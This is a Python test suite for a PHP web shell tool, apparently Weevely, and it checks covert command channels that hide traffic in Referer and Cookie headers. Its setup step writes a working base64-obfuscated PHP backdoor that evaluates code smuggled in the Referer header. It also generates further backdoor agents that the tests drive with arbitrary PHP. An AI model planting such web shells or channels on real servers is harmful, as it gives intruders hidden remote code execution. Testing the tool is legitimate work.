from tests.base_test import BaseTest
from core.channels.channel import Channel
from core.weexceptions import DevException
import utils
from core.generate import generate, save_generated
import os
import random
import unittest
from tests import config
from core.loggers import stream_handler
import logging
import subprocess
import tempfile
import core.config
import socket

def setUpModule():
    subprocess.check_output("""
BASE_FOLDER="{config.base_folder}/test_channels/"
PWD="{config.password}"
rm -rf "$BASE_FOLDER"
mkdir -p "$BASE_FOLDER"
echo "<?php eval(base64_decode('cGFyc2Vfc3RyKCRfU0VSVkVSWy\
dIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2FzJyAmJiBj\
b3VudCgkYSk9PTkpIHsgZWNobyAnPGRhc2Q+JztldmFsKGJhc2U2NF9kZWN\
vZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGE\
sY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L2Rhc2Q+Jzt9')); ?>" > "$BASE_FOLDER/legacyreferrer.php"
python ./weevely.py generate -agent stegaref_php_debug "$PWD" "$BASE_FOLDER/stegaref.php"
python ./weevely.py generate -agent stegaref_php_debug "$PWD" "$BASE_FOLDER/stegaref_php_debug.php"
python ./weevely.py generate -agent legacycookie_php "$PWD" "$BASE_FOLDER/legacycookie_php.php"
""".format(
config = config
), shell=True)

def _get_google_ip():
    try:
        data = socket.gethostbyname('www.google.com')
        ip = repr(data)
        if ip:
            return ip
    except Exception:
        pass

class BaseStegaRefChannel(BaseTest):

    def setUp(self):
        self.channel = Channel(
            'StegaRef',
            {
                'url' : config.base_url + '/test_channels/stegaref.php',
                'password' : self.password
            }
        )

    def _incremental_requests(
            self,
            size_start,
            size_to,
            step_rand_start,
            step_rand_to):

        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
            payload = utils.strings.randstr(i)
            self.assertEqual(
                self.channel.send(
                    'echo("%s");' %
                    payload)[0],
                payload)


class StegaRefChannelAdditionalHeaders(BaseStegaRefChannel):

    def test_additional_headers(self):
        self.channel.channel_loaded.additional_headers = [
            ( 'Cookie', 'C1=F1; C2=F2; C3=F3; C4=F4'),
            ( 'Accept', 'ACCEPT1'),
            ( 'Referer', 'REFERER1'),
            ( 'X-Other-Cookie', 'OTHERCOOKIE')
        ]

        headers_string = self.channel.send(
                            'print_r(getallheaders());'
        )[0]

        # Cookiejar used to add cookies in additional headers add them in casual orders
        self.assertIn('C1=F1', headers_string)
        self.assertIn('C2=F2', headers_string)
        self.assertIn('C3=F3', headers_string)
        self.assertIn('C4=F4', headers_string)
        self.assertNotIn('ACCEPT1', headers_string)
        self.assertNotIn('REFERER1', headers_string)
        self.assertIn('OTHERCOOKIE', headers_string)



class StegaRefChannelWrongCert(BaseTest):

    def setUp(self):
        
        ip = _get_google_ip()
        if not ip:
            return 
            
        url = 'https://%s/nonexistent' % (ip)
        
        self.channel = Channel(
            'StegaRef',
            {
                'url' : url,
                'password' : 'none'
            }
        )

    def test_wrong_cert(self):
        
        try:
            self.channel.send('echo("1");')
        except Exception as e:
            self.fail("test_wrong_cert exception\n%s" % (str(e)))

@unittest.skipIf(
    not config.test_stress_channels,
    "Test only default generator agent")
class StegaRefChannel(BaseStegaRefChannel):

    def test_1_100_requests(self):
        self._incremental_requests(1, 100, 1, 3)

    def test_100_1000_requests(self):
        self._incremental_requests(100, 1000, 90, 300)

    def test_1000_10000_requests(self):
        self._incremental_requests(1000, 10000, 900, 3000)

    def test_10000_50000_requests(self):
        self._incremental_requests(10000, 50000, 9000, 30000)


@unittest.skipIf(
    not config.test_stress_channels,
    "Test only default generator agent")
class LegacyCookieChannel(BaseTest):

    url = config.base_url + '/test_channels/legacycookie_php.php'

    def setUp(self):
        
        self.channel = Channel(
            'LegacyCookie',
            {
                'url' : self.url,
                'password' : self.password
            }
        )

    def _incremental_requests(
            self,
            size_start,
            size_to,
            step_rand_start,
            step_rand_to):

        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
            payload = utils.strings.randstr(i)
            self.assertEqual(
                self.channel.send(
                    'echo("%s");' %
                    payload)[0],
                payload)

    def test_1_100_requests(self):
        self._incremental_requests(1, 100, 1, 2)

    def test_100_1000_requests(self):
        self._incremental_requests(100, 1000, 10, 20)

    def test_additional_headers(self):
        self.channel.channel_loaded.additional_headers = [
            ( 'Cookie', 'C1=F1; C2=F2; C3=F3; C4=F4;'),
            ( 'User-Agent', 'CLIENT'),
            ( 'X-Other-Cookie', 'OTHER')
        ]

        headers_string = self.channel.send(
                            'print_r(getallheaders());'
        )[0]

        self.assertRegexpMatches(headers_string, '\[Cookie\] => [A-Z0-9]+=[^ ]{2}; C1=F1; C2=F2; C3=F3; C4=F4(; [A-Z0-9]+=[^ ]+)+')
        self.assertRegexpMatches(headers_string, '\[User-Agent\] => CLIENT')
        self.assertRegexpMatches(headers_string, '\[X-Other-Cookie\] => OTHER')

        self.channel.channel_loaded.additional_headers = [ ]

    def test_wrong_cert(self):
        
        ip = _get_google_ip()
        if not ip:
            return 
            
        url = 'https://%s/nonexistent' % (ip)
        
        channel = Channel(
            'LegacyCookie',
            {
                'url' : url,
                'password' : 'none'
            }
        )
        
        try:
            channel.send('echo("1");')
        except Exception as e:
            self.fail("LegacyCookie test_wrong_cert exception\n%s" % (str(e)))


@unittest.skipIf(
    not config.test_stress_channels,
    "Test only default generator agent")
class LegacyReferrerChannel(BaseTest):

    url = config.base_url + '/test_channels/legacyreferrer.php'
    password = 'asdasd'

    def setUp(self):
        self.channel = Channel(
            'LegacyReferrer',
            {
                'url' : self.url,
                'password' : self.password
            }
        )

    def _incremental_requests(
            self,
            size_start,
            size_to,
            step_rand_start,
            step_rand_to):

        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
            payload = utils.strings.randstr(i)
            self.assertEqual(
                self.channel.send(
                    'echo("%s");' %
                    payload)[0],
                payload)

    def test_1_100_requests(self):
        self._incremental_requests(1, 100, 1, 2)

    def test_100_1000_requests(self):
        self._incremental_requests(100, 1000, 10, 20)

    def test_additional_headers(self):
        self.channel.channel_loaded.additional_headers = [
            ( 'Cookie', 'C1=F1; C2=F2; C3=F3; C4=F4'),
            ( 'Referer', 'REFERER'),
            ( 'X-Other-Cookie', 'OTHER')
        ]

        headers_string = self.channel.send(
                            'print_r(getallheaders());'
        )[0]

        self.assertIn('[Cookie] => C1=F1; C2=F2; C3=F3; C4=F4', headers_string)
        self.assertNotIn('REFERER1', headers_string)
        self.assertIn('[X-Other-Cookie] => OTHER', headers_string)


    def test_wrong_cert(self):
        
        ip = _get_google_ip()
        if not ip:
            return 
            
        url = 'https://%s/nonexistent' % (ip)
        
        channel = Channel(
            'LegacyReferrer',
            {
                'url' : url,
                'password' : 'none'
            }
        )
        
        try:
            channel.send('echo("1");')
        except Exception as e:
            self.fail("LegacyReferrer test_wrong_cert exception\n%s" % (str(e)))


class ObfPostChannel(BaseTest):

    def setUp(self):
        self.channel = Channel(
            'ObfPost',
            {
                'url' : self.url,
                'password' : self.password
            }
        )

    def _incremental_requests(
            self,
            size_start,
            size_to,
            step_rand_start,
            step_rand_to):

        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
            payload = utils.strings.randstr(i)
            self.assertEqual(
                self.channel.send(
                    'echo("%s");' %
                    payload)[0],
                payload)

class AgentDEFAULTObfuscatorDefault(ObfPostChannel):

    def test_1_100_requests(self):
        self._incremental_requests(1, 100, 1, 3)

    def test_100_1000_requests(self):
        self._incremental_requests(100, 1000, 90, 300)

    def test_1000_10000_requests(self):
        self._incremental_requests(1000, 10000, 900, 3000)

    def test_10000_50000_requests(self):
        self._incremental_requests(10000, 50000, 9000, 30000)
        
